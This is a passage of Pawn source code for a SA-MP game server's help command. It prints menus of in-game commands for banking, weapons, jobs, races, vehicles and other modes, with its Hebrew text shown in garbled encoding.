				SendClientMessage(playerid,white," (37) Clothes Shop  (38) Houses  (39) Math  (40) Trivia  (41) Contact  (42) Super Bonuses  (43) Private Messages");
				SendClientMessage(playerid,white," (44) Kickstar  (45) Crane  (46) Colors  (47) Reply Test  (48) NPCs  (49) Bar  (50) Codes");
				//SendClientMessage(playerid,white," (51) Codes");
				return 1;
			}
			switch(strval(cmd))
			{
				case 1:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (1 - Teleports - ùéâåøéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áòæøú ô÷åãåú äùéâåøéí ðéúï ìäâéò ìî÷åîåú ùåðéí ììà îàîõ åîëì îøç÷");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äùéâåøéí");
						SendClientMessage(playerid,yellow," /tl  /tm  /nsteles  /stl  /tinfo");
						SendClientMessage(playerid,grey," /help mode 1 [1-2] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (1 - Teleports - ùéâåøéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /tl - öôééä áøùéîú äùéâåøéí ä÷ééîéí åáôøèéäí");
						SendClientMessage(playerid,orange," * /tm - ùéâåø ìî÷åí îñåééí áàîöòåú úôøéè");
						SendClientMessage(playerid,orange," * /nsteles - øùéîú äùéâåøéí áäí àñåø ìéøåú");
						SendClientMessage(playerid,orange," * /stl - øùéîú ùéâåøéí îéåçãéí");
						SendClientMessage(playerid,orange," * /tinfo - äöâú îéãò àåãåú ùéâåø îñåééí");
					}
				}
				case 2:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (2 - Bank - áð÷) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äáð÷ ùìðå îàôùøú ôúéçú çùáåðåú áð÷ åùîéøú ëñó áî÷åí áèåç, ëê ùééùàø âí ìàçø ùúîåú");
						SendClientMessage(playerid,pink," ...ðéúï ìäô÷éã ëñó, ìîùåê ëñó, ìäòáéø ëñó àì ùç÷ðéí àçøéí, åòåã");
						SendClientMessage(playerid,purple," » :àôùøåéåú ðåñôåú ááð÷");
						SendClientMessage(playerid,pink,"  ëøèéñé àùøàé: îàôùøéí ìê ì÷ðåú ãáøéí îñåééîéí áàîöòåú äëñó ùðîöà áçùáåï äáð÷ ùìê");
						SendClientMessage(playerid,pink,"  ëñôú äáð÷: áëì ôòí ùùç÷ï îô÷éã ëñó, ðåñôéí àìéä 5 %% îäëñó ùäåô÷ã. ðéúï ì÷áì îîðä äìååàåú åàôéìå ìùãåã àåúä");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äáð÷");
						SendClientMessage(playerid,yellow," /baccount  /deposit  /withdraw  /transfer  /balance  /depositall  /withdrawall");
						SendClientMessage(playerid,yellow," /transferall  /rmmflv  /buycc  /sellcc  /sdbox  /bmenu");
						SendClientMessage(playerid,grey," /help mode 2 [1-3] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (2 - Bank - áð÷) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /baccount create - ôúéçú çùáåï áð÷");
						SendClientMessage(playerid,orange," * /baccount remove - îçé÷ú çùáåï äáð÷ ùìê");
						SendClientMessage(playerid,orange," * /baccount log - öôééä á10 äôòåìåú äàçøåðåú ùì çùáåï äáð÷ ùìê");
						SendClientMessage(playerid,orange," * /baccount clear - îçé÷ú ìåâ äáð÷ ùìê");
						SendClientMessage(playerid,orange," * /baccount withdraw - îùéëú ëñó îçùáåï áð÷ ùìà ùééê ìê");
						SendClientMessage(playerid,orange," * /baccount balance - áãé÷ú îàæï äëñó áçùáåï áð÷ ùìà ùééê ìê");
						SendClientMessage(playerid,orange," * /baccount password - ùéðåé äñéñîà ùì çùáåï äáð÷ ùìê");
						SendClientMessage(playerid,orange," * /deposit - äô÷ãú ëñó ááð÷");
						SendClientMessage(playerid,grey," * /help mode 2 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (2 - Bank - áð÷) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /withdraw - îùéëú ëñó îäáð÷");
						SendClientMessage(playerid,orange," * /transfer - (äòáøú ëñó àì ùç÷ï (øùåí àééãé àí äåà îçåáø àå ëéðåé àí äåà ìà îçåáø");
						SendClientMessage(playerid,orange," * /balance - áãé÷ú îàæï äëñó áçùáåï äáð÷ ùìê");
						SendClientMessage(playerid,orange," * /depositall - äô÷ãú ëì äëñó ùáéãê ááð÷");
						SendClientMessage(playerid,orange," * /withdrawall - îùéëú ëì äëñó ùáçùáåï äáð÷ ùìê");
						SendClientMessage(playerid,orange," * /transferall - (äòáøú ëì äëñó ùáçùáåï äáð÷ ùìê àì ùç÷ï (øùåí àééãé àí äåà îçåáø àå ëéðåé àí äåà ìà îçåáø");
						SendClientMessage(playerid,orange," * /rmmfov - (Return My Money From Old Versions) äçæøú ëì äëñôéí ùìê îâøñàåú ÷åãîåú");
						SendClientMessage(playerid,orange," * /buycc - ÷ðééú ëøèéñ àùøàé áîçéø 700000$");
						SendClientMessage(playerid,grey," * /help mode 2 3 - ìäîùê");
					}
					if(num == 3)
					{
						SendClientMessage(playerid,lightblue," ~~~ (2 - Bank - áð÷) Mode Commands [#3] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /sellcc - îëéøú ëøèéñ äàùøàé ùìê: úøååéç çöé îñëåí ä÷ðééä, 350000$");
						SendClientMessage(playerid,orange," * /sdbox balance - áãé÷ú îàæï äëñôú");
						SendClientMessage(playerid,orange," * /sdbox deposit - äåñôú ëñó ìëñôú");
						SendClientMessage(playerid,orange," * /sdbox depositall - äåñôú ëñó ìëñôú");
						SendClientMessage(playerid,orange," * /sdbox loan - îùéëú äìååàä îäëñôú");
						SendClientMessage(playerid,orange," * /sdbox loans - øùéîú äìååàåú îåúøåú ìôé øîåú");
						SendClientMessage(playerid,orange," * /sdbox rob - ðéñéåï ìùãéãú äëñôú");
						SendClientMessage(playerid,orange," * /sdbox robsuccess - øùéîú àçåæé äöìçä áùãéãú äëñôú ìôé øîåú");
						SendClientMessage(playerid,orange," * /bmenu - úôøéè äáð÷");
					}
				}
				case 3:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (3 - Levels - îòøëú øîåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îùúîùéí øùåîéí éëåìéí ì÷ðåú øîåú, ìàçø ùäâéòå ìñëåí ëñó åäøéâåú îñåééí áùøú");
						SendClientMessage(playerid,pink," .äòìàú øîåú îåòéìä áîñôø ãáøéí ëâåï ëáåã, îéðéîåí çééí ìùéâåø, äâáìú ëñó ááð÷, åòåã");
						SendClientMessage(playerid,pink," .ðéúï ìøàåú ìîòìä (ìéã îã äçééí) àú îñôø ääøéâåú ùìëí ëøâò åàú îñôø ääøéâåú ìøîä äáàä");
						SendClientMessage(playerid,pink," .ìëì øîä éù ô÷åãåú åéëåìåú îâðéáåú ùî÷áìéí áä");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äøîåú");
						SendClientMessage(playerid,yellow," /level  /levels  /buylevel  /lcmds  /lcinfo  /cupgrade  /upower  /upower2");
						SendClientMessage(playerid,grey," /help mode 3 [1-3] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (3 - Levels - îòøëú øîåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /level - áãé÷ú îéãò àåãåú äøîä äáàä ùìê");
						SendClientMessage(playerid,orange," * /levels - áãé÷ú îéãò ìâáé ëì äøîåú");
						SendClientMessage(playerid,orange," * /buylevel - (÷ðééú øîä (òìééú øîä");
						SendClientMessage(playerid,orange," * /lcmds - øùéîú ô÷åãåú ìøîåú");
						SendClientMessage(playerid,orange," * /lcinfo - ÷áìú îéãò ìâáé ô÷åãä ìøîåú");
						SendClientMessage(playerid,orange," * /cupgrade - ùãøåâ ô÷åãä ëìùäéú");
						SendClientMessage(playerid,orange," * /upower - éëåìú ééçåãéú çæ÷ä îàåã :Ultimate Power îéãò ìâáé");
						SendClientMessage(playerid,orange," * /upower2 - Ultimate Power áãéå÷ ëîå äô÷åãä ä÷åãîú. ðéúðú àôùøåú ìùìåè áùðé");
					}
				}
				case 4:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (4 - Ammunation - çðåú ðù÷éí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áòæøú îòøëú çðåú äðù÷éí ùáùøúéðå, ðéúðú ìê àôùøåú ì÷ðåú ðù÷éí ùééùîøå âí ìàçø ùúîåú");
						SendClientMessage(playerid,pink," .áîéãä åäéðê îùúîù øùåí, äðù÷éí ééùîøå âí àí úöà îäîùç÷");
						SendClientMessage(playerid,purple," » :ô÷åãåú ðù÷éí");
						SendClientMessage(playerid,yellow," /bw  /wl  /resetw  /ccbw  /wmenu  /parachute");
						SendClientMessage(playerid,purple," » :îâï úîéãé - îøîä 9 áìáã");
						SendClientMessage(playerid,yellow," /armour  /ccarmour");
						SendClientMessage(playerid,grey," /help mode 4 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (4 - Ammunation - çðåú ðù÷éí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /buyweapon (/bw) - ÷ðééú ðù÷");
						SendClientMessage(playerid,orange," * /weaponlist (/wl) - øùéîú äðù÷éí äðéúðéí ì÷ðééä");
						SendClientMessage(playerid,orange," * /resetw - îçé÷ú äðù÷éí ùìê, ëåìì äúîéãééí");
						SendClientMessage(playerid,orange," * /ccbuyweapon (/ccbw) - ÷ðééú ðù÷ áàîöòåú ëøèéñ àùøàé");
						SendClientMessage(playerid,orange," * /armour - ÷ðééú îâï úîéãé, ìøîä 9");
						SendClientMessage(playerid,orange," * /ccarmour - ÷ðééú îâï úîéãé áàîöòåú ëøèéñ àùøàé, ìøîä 9");
						SendClientMessage(playerid,orange," * /wmenu - úôøéè çðåú äðù÷éí");
						SendClientMessage(playerid,orange," * /parachute (/para) - ÷áìú îðöç");
					}
				}
				case 5:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (5 - Money - äøååçú ëñó) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ðéúï ìäùéâ ëñó áãøëéí ùåðåú åîâååðåú");
						SendClientMessage(playerid,purple," » :ãøëéí ìäøååçú ëñó");
						SendClientMessage(playerid,yellow," ~ ùäå áàéæåøéí ìäøååçú ëñó ~ äøâå ùç÷ðéí òùéøéí ~ äøâå ùç÷ðéí áøöó ~");
						SendClientMessage(playerid,yellow," ~ äùúîùå áîòøëú äòáåãåú ~ ÷ðå ðëñéí ~ ðöçå áôòéìåéåú ~ îëøå øëáéí ìîåñê ååàðâ ~");
						SendClientMessage(playerid,purple," » :ô÷åãåú ä÷ùåøåú áëñó");
						SendClientMessage(playerid,yellow," /givecash  /resetm  /shekel");
						SendClientMessage(playerid,grey," /help mode 5 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (5 - Money - äøååçú ëñó) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /givecash (/pay) - ùìéçú ëñó ìùç÷ï àçø");
						SendClientMessage(playerid,orange," * /resetm - îçé÷ú ëì äëñó ùáéãê");
						SendClientMessage(playerid,orange," * /shekel - (ùìéçú ù÷ì ìùç÷ï (ô÷åãä äåîåøéñèéú");
					}
				}
				case 6:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (6 - Wang - îåñê ååàðâ) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îåñê ååàðâ äéðå îåñê øëáéí äîçôù îãé ôòí øëáéí åîæëä áôøñ ëñôé ùç÷ðéí ùîáéàéí ìå àåúí");
						SendClientMessage(playerid,pink," !áìåç äîåãòåú, îúôøñí ùí äøëá àåúå äîåñê îçôù - îöàå àåúå, äáéàå àåúå àì äîåñê åæëå áëñó");
						SendClientMessage(playerid,purple," » :ô÷åãåú îåñê ååàðâ");
						SendClientMessage(playerid,yellow," /exports");
						SendClientMessage(playerid,grey," /help mode 6 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (6 - Wang - îåñê ååàðâ) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /exports - áãé÷ú äøëá äðåëçé ùîåñê ååàðâ îçôù");
					}
				}
				case 7:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (7 - Properties - îòøëú ðëñéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .äðëñéí äéðí äãøê äèåáä áéåúø ìäøååçú ëñó");
						SendClientMessage(playerid,pink," .ìéã î÷åîåú îñåééîéí úåëìå ìîöåà ôé÷-àô ùì áéú éøå÷, ùäåà áòöí äðëñ òöîå: òîãå òìéå åú÷áìå ôøèéí");
						SendClientMessage(playerid,pink," .ëì ùç÷ï áòì ðëñ àçã àå éåúø, éøååéç îùëåøåú îðëñéå áëì ùúé ã÷åú");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äðëñéí");
						SendClientMessage(playerid,yellow," /property  /buy  /sell  /earnings");
						SendClientMessage(playerid,grey," /help mode 7 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (7 - Properties - îòøëú ðëñéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /property - áãé÷ú îéãò ìâáé ðëñ");
						SendClientMessage(playerid,orange," * /buy - ÷ðééú ðëñ");
						SendClientMessage(playerid,orange," * /sell - îëéøú ðëñ, ìøîä 2");
						SendClientMessage(playerid,orange," * /earnings - áçéøä ùì äãøê áä äëñó îäðëñéí éåòáø àìéê, ìøîä 12");
					}
				}
				case 8:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (8 - Races - ôòéìåú àåèåîèéú: îéøåöéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áôòéìåú äîéøåõ äàåèåîèéú äæå, ðéúï ìäúçøåú òí ùç÷ðéí àçøéí òì úåäø äùç÷ï äîäéø");
						SendClientMessage(playerid,pink," ,ìàçø úçéìú äôòéìåú éåôéòå ð÷åãåú àãåîåú, ùòìéëí ìäâéò àìéäï òì îðú ìöôåú áð÷åãåú ðåñôåú");
						SendClientMessage(playerid,pink," .äîèøä äéà ìäâéò àì äð÷åãä äñåôéú ëîä ùéåúø îäø åììà ÷éöåøé ãøê");
						SendClientMessage(playerid,pink," .áîòøëú äîéøåöéí ùìðå, ÷ééîéí 5 ñåâéí ùåðéí ùì îéøåöéí ëàùø ìëì ñåâ ÷ééîéí 3 îñìåìéí");
						SendClientMessage(playerid,purple," » :ôøñéí");
						SendClientMessage(playerid,yellow," î÷åí øàùåï - 50000$ | î÷åí ùðé - 25000$ | î÷åí ùìéùé - 10000$");
						SendClientMessage(playerid,purple," » :ô÷åãåú îéøåõ");
						SendClientMessage(playerid,yellow," /racing");
						SendClientMessage(playerid,grey," /help mode 8 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (8 - Races - ôòéìåú àåèåîèéú: îéøåöéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /racing state - áãé÷ú îöá äîéøåõ äðåëçé");
						SendClientMessage(playerid,orange," * /racing join - äöèøôåú ìîéøåõ");
						SendClientMessage(playerid,orange," * /racing quit - ôøéùä îäîéøåõ");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /racing start - äúçìú îéøåõ");
							SendClientMessage(playerid,orange," * /racing end - ñâéøú îéøåõ");
						}
					}
				}
				case 9:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (9 - Server War - ôòéìåú àåèåîèéú: îìçîú ùøú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ôòéìåú àåèåîèéú ðåñôú äéà îìçîú äùøú");
						SendClientMessage(playerid,pink," .àì îìçîú äùøú éùåâøå ëì äùç÷ðéí ùðøùîå àìéä, åééìçîå òí ðù÷ îñåééí");
						SendClientMessage(playerid,pink," .éùðí ìà îòè ñåâéí ùåðéí ùì îìçîåú ùøú, äëåììéí áéðéäí îìçîåú òí ðù÷ éçéã àå ëì äðù÷éí, áëì îéðé î÷åîåú");
						SendClientMessage(playerid,pink," .äôøñ äëñôé òì äðöçåï áôòéìåú äæå, äéðå 30000$");
						SendClientMessage(playerid,purple," » :ô÷åãåú îìçîú äùøú");
						SendClientMessage(playerid,yellow," /swar");
						SendClientMessage(playerid,grey," /help mode 9 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (9 - Server War - ôòéìåú àåèåîèéú: îìçîú ùøú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /swar state - áãé÷ú îöá äîìçîä äðåëçéú");
						SendClientMessage(playerid,orange," * /swar join - äöèøôåú ìîìçîä");
						SendClientMessage(playerid,orange," * /swar quit - ôøéùä îäîìçîä");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /swar start - äúçìú îìçîä");
							SendClientMessage(playerid,orange," * /swar end - ñâéøú îìçîä");
						}
					}
				}
				case 10:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (10 - Works - îòøëú òáåãåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ùéèä ðåñôú ìäøååçú ëñó äéðä îòøëú äòáåãåú");
						SendClientMessage(playerid,pink," .ëàï àéï ìãòú îäå ñëåí äëñó àùø ú÷áì, æä úìåé áîñôø äì÷åçåú ùéäéå ìê");
						SendClientMessage(playerid,purple," » :òáåãåú àôùøéåú");
						SendClientMessage(playerid,yellow," .ùåèø, øåôà, ðäâ îåðéú, ðäâ àåèåáåñ, ðäâ øëáú, èééñ, îåëø ðù÷éí, øåöç, îåëø âìéãä");
						SendClientMessage(playerid,purple," » :ô÷åãåú òáåãåú");
						SendClientMessage(playerid,yellow," /cop  /doctor  /taxid  /busd  /traind  /pilot  /sweapons  /killer  /sicecream");
						SendClientMessage(playerid,yellow," /sdrugs  /exitwork");
						SendClientMessage(playerid,grey," /help mode 10 [1-2] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (10 - Works - îòøëú òáåãåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /cop - îéãò òì äùåèøéí");
						SendClientMessage(playerid,orange," * /doctor - îéãò òì äøåôàéí");
						SendClientMessage(playerid,orange," * /taxid - îéãò òì ðäâé äîåðéú");
						SendClientMessage(playerid,orange," * /busd - îéãò òì ðäâé äàåèåáåñ");
						SendClientMessage(playerid,orange," * /traind - îéãò òì ðäâé äøëáú");
						SendClientMessage(playerid,orange," * /pilot - îéãò òì äèééñéí");
						SendClientMessage(playerid,orange," * /sweapons - îéãò òì îåëøé äðù÷éí");
						SendClientMessage(playerid,orange," * /killer - îéãò òì äøåöçéí");
						SendClientMessage(playerid,orange," * /sicecream - îéãò òì îåëøé äâìéãä");
						SendClientMessage(playerid,grey," * /help mode 10 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (10 - Works - îòøëú òáåãåú) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /sdrugs - îéãò òì ñåçøé äñîéí");
						SendClientMessage(playerid,orange," * /exitwork - äúôèøåú îäòáåãä");
					}
				}
				case 11:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (11 - Vehicles - çðåú øëáéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áùøúéðå ÷ééîú îòøëú îëåðéåú ì÷ðééä");
						SendClientMessage(playerid,pink," .ðéúï ìäâéò ìçðåú äøëáéí, ìäëðñ ìøëá îñåééí ùàúí øåöéí - ì÷ðåú àåúå");
						SendClientMessage(playerid,pink," .äéúøåï áøëá ÷ðåé, äåà ùàúä éëåì ìæîï àåúå àìéê îúé ùúøöä");
						SendClientMessage(playerid,pink," .áîéãä åäéðëí ùç÷ðéí øùåîéí, äøëá ù÷ðéúí ééùîø ìúîéã");
						SendClientMessage(playerid,purple," » :ô÷åãåú îëåðéåú ÷ðåéåú - îøîä 4 áìáã");
						SendClientMessage(playerid,yellow," /buyv  /callv  /sellv  /ccbuyv");
						SendClientMessage(playerid,grey," /help mode 11 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (11 - Vehicles - çðåú øëáéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /buyv - ÷ðééú øëá îçðåú äîëåðéåú");
						SendClientMessage(playerid,orange," * /callv - ùéâåø øëá ù÷ðéú àìéê");
						SendClientMessage(playerid,orange," * /sellv - îëéøú äøëá ù÷ðéú");
						SendClientMessage(playerid,orange," * /ccbuyv - ÷ðééú øëá îçðåú äîëåðéåú áàîöòåú ëøèéñ àùøàé");
					}
				}
				case 12:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (12 - Stunts & Challenges - ôòìåìéí åàúâøéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áîéåçã ëãé ìùòùò àú ëì äôòìåìðéí ùáéðéðå, äåîöàå àéæåøéí îéåçãéí ìáéöåò ñèàðèéí (ôòìåìéí) äëåììéí ùéâåø");
						SendClientMessage(playerid,pink," .áðåñó, äåîöàå àéæåøé àúâøéí ùåðéí áòìé ùéâåøéí âí äí");
						SendClientMessage(playerid,pink," .ëì äùéâåøéí îåúøéí ìøîä 1, àúâøå àú òöîëí áàúâøéí åäúàîðå òì ôòìåìéí");
						SendClientMessage(playerid,purple," » :ùéâåøéí ìàéæåøé äôòìåìéí");
						SendClientMessage(playerid,yellow," /ramp  /stunts  /fun  /bigrampa  /thevert  /slide");
						SendClientMessage(playerid,purple," » :ùéâåøéí ìàéæåøé äàúâøéí");
						SendClientMessage(playerid,yellow," /aprace  /challenge  /lwu  /maze  /bchallenge");
						SendClientMessage(playerid,grey," /help mode 12 [1-2] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (12 - Stunts & Challenges - ôòìåìéí åàúâøéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /ramp - Los Santos ùéâåø ìàéæåø äøàîôåú á");
						SendClientMessage(playerid,orange," * /stunts - ùéâåø ìàéæåø ôòìåìéí [by Fyro]");
						SendClientMessage(playerid,orange," * /fun - Fun ùéâåø ìàéæåø [by Firo]");
						SendClientMessage(playerid,orange," * /bigrampa - ùéâåø ìøàîôä äâãåìä áéåúø áîùç÷ [by Yosi]");
						SendClientMessage(playerid,orange," * /thevert - The Vert ùéâåø ìàéæåø [by FrighT");
						SendClientMessage(playerid,orange," * /slide - ùéâåø ìîâìùä òð÷éú [by FrighT]");
						SendClientMessage(playerid,orange," * /aprace - ùéâåø ìîéøåõ îàúâø [by BroLeX]");
						SendClientMessage(playerid,orange," * /challenge - ùéâåø ìîâãì äàúâø [by SouLeSs]");
						SendClientMessage(playerid,grey," * /help mode 12 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (12 - Stunts & Challenges - ôòìåìéí åàúâøéí) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /lwu - LWU ùéâåø ìàéæåø [by Yosi]");
						SendClientMessage(playerid,orange," * /maze - ùéâåø ìîáåê [by Yosi]");
						SendClientMessage(playerid,orange," * /bchallenge - ùéâåø ìèéåì îàúâø [by Yuval]");
					}
				}
				case 13:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (13 - WWE - WWE :ôòéìåú àåèåîèéú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ôòéìåú ðåñôú æå, îàôùøú ÷øá àéâøåó áéï ùðé ùç÷ðéí áìáã");
						SendClientMessage(playerid,pink," .áðåñó ÷ééîú àôùøåú ìöôåú áúçøåú äàéâøåó åìãòú îé äîðöç òåã ìôðé ùùîå îúôøñí");
						SendClientMessage(playerid,pink," .äîðöç áôòéìåú àåèåîèéú æå ééæëä áôøñ ëñôé áùååé 10000$");
						SendClientMessage(playerid,purple," » :WWE ô÷åãåú ä÷ùåøåú á");
						SendClientMessage(playerid,yellow," /wwe");
						SendClientMessage(playerid,grey," /help mode 13 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (13 - WWE - WWE :ôòéìåú àåèåîèéú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /wwe state - äðåëçéú WWE áãé÷ú îöá úçøåú ä");
						SendClientMessage(playerid,orange," * /wwe join - WWE äöèøôåú ìúçøåú ä");
						SendClientMessage(playerid,orange," * /wwe quit - WWE ôøéùä îúçøåú ä");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /wwe start - WWE äúçìú úçøåú");
							SendClientMessage(playerid,orange," * /wwe end - WWE ñâéøú úçøåú");
						}
						SendClientMessage(playerid,orange," * /wwe viewer - áúåø öåôä WWE äøùîä ìúçøåú ä");
					}
				}
				case 14:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (14 - Lotto - ôòéìåú ö'àè: ìåèå) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," áîåã æä ÷ééîú ôòéìåú ö'àè îñåâ ìåèå, áä ëì ùç÷ï øùàé ìðçù îñôø îñåééí, áîéãä åäîñôø ùðéçù äùç÷ï äéðå");
						SendClientMessage(playerid,pink," .äîñôø äà÷øàé ùééöà áäâøìä, àåúå äùç÷ï ééæëä áôøñ ëñôé îëåáã åà÷øàé áéï 100000$ ì 750000$");
						SendClientMessage(playerid,pink," .ôòéìåú ö'àè îúçéìä áëì 15 ã÷åú, ééúëï ùôòéìåú æå úäéä ôòéìåú ìåèå");
						SendClientMessage(playerid,purple," » :ô÷åãåú ìåèå");
						SendClientMessage(playerid,yellow,IsPlayerMAdmin(playerid)? (" /lotto  /startlotto"):(" /lotto"));
						SendClientMessage(playerid,grey," /help mode 14 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (14 - Lotto - ôòéìåú ö'àè: ìåèå) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
